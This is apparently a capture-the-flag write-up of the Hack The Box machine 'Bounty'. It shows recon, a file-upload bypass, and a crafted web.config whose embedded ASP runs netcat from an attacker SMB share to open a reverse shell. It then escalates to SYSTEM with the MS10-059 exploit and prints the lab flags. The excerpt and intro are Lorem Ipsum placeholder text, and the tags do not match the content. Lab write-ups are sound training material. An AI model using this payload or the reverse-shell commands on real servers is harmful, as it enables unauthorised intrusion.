---
layout: single
title: Bounty - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-02-28
classes: wide
header:
  teaser: /assets/images/htb-writeup-bounty/bounty_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-bounty/bounty_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝


1. [root:/git/htb/bounty]# nmap -Pn -n -sCV 10.10.10.93 --open                                                                       (master✱)
    PORT   STATE SERVICE VERSION
    80/tcp open  http    Microsoft IIS httpd 7.5
    | http-methods:
    |_  Potentially risky methods: TRACE
    |_http-server-header: Microsoft-IIS/7.5
    |_http-title: Bounty
    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows


  DIRB:
  ==> DIRECTORY: http://10.10.10.93/aspnet_client/
  ==> DIRECTORY: http://10.10.10.93/uploadedfiles/

  NIKTO:
  + Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, POST


2. Visiting port 80 we only see merlin.jpg, download the image to see if something is hidden within.

    [root:/git/htb/bounty]# binwalk -e merlin.jpg
      DECIMAL       HEXADECIMAL     DESCRIPTION
      --------------------------------------------------------------------------------
      0             0x0             JPEG image data, JFIF standard 1.02
      30            0x1E            TIFF image data, big-endian, offset of first image directory: 8
      332           0x14C           JPEG image data, JFIF standard 1.02
      7637          0x1DD5          JPEG image data, JFIF standard 1.02

  Binwalk doesn't extract anything, however we can see two other images with offset 332 and 7637. Extract them with dd.

    [root:/git/htb/bounty]# dd if=merlin.jpg of=out.jpg skip=332 bs=1                                                               (master✱)
      780400+0 records in
      780400+0 records out
      780400 bytes (780 kB, 762 KiB) copied, 2.0058 s, 389 kB/s

    [root:/git/htb/bounty]# dd if=merlin.jpg of=out2.jpg skip=7637 bs=1                                                             (master✱)
      773095+0 records in
      773095+0 records out
      773095 bytes (773 kB, 755 KiB) copied, 2.52271 s, 306 kB/s

  Both images have the same illustration, merlin, but are smaller - like a thumbnail. This leads to nothing, move one.
  Start to fuzz to see if we can find anything else.

    root@nidus:~/Downloads# ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://bounty.htb/FUZZ.aspx
      --- snip ---
      transfer                [Status: 200, Size: 941, Words: 89, Lines: 22]


3. Our new found side, http://10.10.10.93/transfer.aspx, allows us to upload files.
   We can't see what file type is allowed by looking at the source, but trying a few we can see .jpg is allowed.
   By judging of the merlin picture, we should use 'magic' (magic byte) to bypass this and get our foothold.

  Trying to upload the aspx-file and changing content type from "application/octet-stream" to "image/jpeg" doesn't work.
  Changing the filename from "rev.aspx" to "rev.jpg" works and is allowed, however that doesn't do anything for us.

  To find all available extensions, intercept the upload and send it to burp intruder. Set the extension as target, and upload
  the extension list as payload. Run and we find following allowed extensions:
    gif, jpg, png, doc, config, jpeg, xls, xlsx, docx

  A web.config file lets you customize the way your site or a specific directory on your site behaves. For example, if you
  place a web.config file in your root directory, it will affect your entire site. If you place it in a /content directory,
  it will only affect that directory.

  There is a known RCE vulnerability with web.config-files, download and modify it to trigger a reverse shell.

  [root:/git/htb/bounty]# cat web.config                                                                                          (master✱)
    <?xml version="1.0" encoding="UTF-8"?>
    <configuration>
       <system.webServer>
          <handlers accessPolicy="Read, Script, Write">
             <add name="web_config" path="*.config" verb="*" modules="IsapiModule" scriptProcessor="%windir%\system32\inetsrv\asp.dll" resourceType="Unspecified" requireAccess="Write" preCondition="bitness64" />
          </handlers>
          <security>
             <requestFiltering>
                <fileExtensions>
                   <remove fileExtension=".config" />
                </fileExtensions>
                <hiddenSegments>
                   <remove segment="web.config" />
                </hiddenSegments>
             </requestFiltering>
          </security>
       </system.webServer>
       <appSettings>
    </appSettings>
    </configuration>
    <!–-
    <% Response.write("-"&"->")
    Response.write("<pre>")
    Set wShell1 = CreateObject("WScript.Shell")
    Set cmd1 = wShell1.Exec("//10.10.14.8/share/nc64.exe 10.10.14.8 4488 -e cmd")
    output1 = cmd1.StdOut.Readall()
    set cmd1 = nothing: Set wShell1 = nothing
    Response.write(output1)
    Response.write("</pre><!-"&"-") %>
    -–>

  Start your SMB Share, upload the 'web.config' file, setup a listener and grab the incomming shell.

  [root:/git/htb/bounty]# rlwrap nc -lvnp 4488                                                                                      (master✱)
    listening on [any] 4488 ...
    connect to [10.10.14.8] from (UNKNOWN) [10.10.10.93] 49160
    Microsoft Windows [Version 6.1.7600]
    Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

    c:\windows\system32\inetsrv> whoami
      bounty\merlin

    c:\windows\system32\inetsrv> type C:\Users\merlin\Desktop\user.txt
      e29ad89891462e0b09741e3082f44a2f



██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Grab systeminfo and run windows-exploit-suggester locally.

[root:/git/htb/bounty]# python /opt/windows-exploit-suggester.py --update                                                       (master✱)
  [*] initiating winsploit version 3.3...
  [+] writing to file 2021-03-04-mssb.xls
  [*] done
[root:/git/htb/bounty]# python /opt/windows-exploit-suggester.py --database 2021-03-04-mssb.xls --systeminfo systeminfo.txt     (master✱)
  [*] initiating winsploit version 3.3...
  [*] database file detected as xls or xlsx based on extension
  [*] attempting to read from the systeminfo input file
  [+] systeminfo input file read successfully (ascii)
  [*] querying database file for potential vulnerabilities
  [*] comparing the 0 hotfix(es) against the 197 potential bulletins(s) with a database of 137 known exploits
  [*] there are now 197 remaining vulns
  [+] [E] exploitdb PoC, [M] Metasploit module, [*] missing bulletin
  [+] windows version identified as 'Windows 2008 R2 64-bit'
  [*]
  [M] MS13-009: Cumulative Security Update for Internet Explorer (2792100) - Critical
  [M] MS13-005: Vulnerability in Windows Kernel-Mode Driver Could Allow Elevation of Privilege (2778930) - Important
  [E] MS12-037: Cumulative Security Update for Internet Explorer (2699988) - Critical
  [*]   http://www.exploit-db.com/exploits/35273/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5., PoC
  [*]   http://www.exploit-db.com/exploits/34815/ -- Internet Explorer 8 - Fixed Col Span ID Full ASLR, DEP & EMET 5.0 Bypass (MS12-037), PoC
  [*]
  [E] MS11-011: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (2393802) - Important
  [M] MS10-073: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege (981957) - Important
  [M] MS10-061: Vulnerability in Print Spooler Service Could Allow Remote Code Execution (2347290) - Critical
  [E] MS10-059: Vulnerabilities in the Tracing Feature for Services Could Allow Elevation of Privilege (982799) - Important
  [E] MS10-047: Vulnerabilities in Windows Kernel Could Allow Elevation of Privilege (981852) - Important
  [M] MS10-002: Cumulative Security Update for Internet Explorer (978207) - Critical
  [M] MS09-072: Cumulative Security Update for Internet Explorer (976325) - Critical
  [*] done


  HTB don't want any Kernel exploits to be used, so with that in mind we only have MS10-059 for instant privesc.

  [root:/git/htb/bounty]# cp /opt/windows-kernel-exploits/MS10-059/MS10-059.exe /srv/pub-share                                    (master✱)
  [root:/git/htb/bounty]# chmod +x /srv/pub-share/MS10-059.exe

  C:\> //10.10.14.8/share/MS10-059.exe 10.10.14.8 4499
    /Chimichurri/-->This exploit gives you a Local System shell
    /Chimichurri/-->Changing registry values...
    /Chimichurri/-->Got SYSTEM token...
    /Chimichurri/-->Running reverse shell...
    /Chimichurri/-->Restoring default registry values...

  [root:/git/htb/bounty]# rlwrap nc -lvnp 4499                                                                                      (master✱)
  listening on [any] 4499 ...
  connect to [10.10.14.8] from (UNKNOWN) [10.10.10.93] 49163
  Microsoft Windows [Version 6.1.7600]
  Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

  C:\> whoami
  nt authority\system

  C:\> type C:\Users\Administrator\Desktop\root.txt
    c837f7b699feef5475a0c079f9d4f5ea


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝

File Extension List:
  https://gist.github.com/securifera/e7eed730cbe1ce43d0c29d7cd2d582f4

web.config RCE:
  https://poc-server.com/blog/2018/05/22/rce-by-uploading-a-web-config/
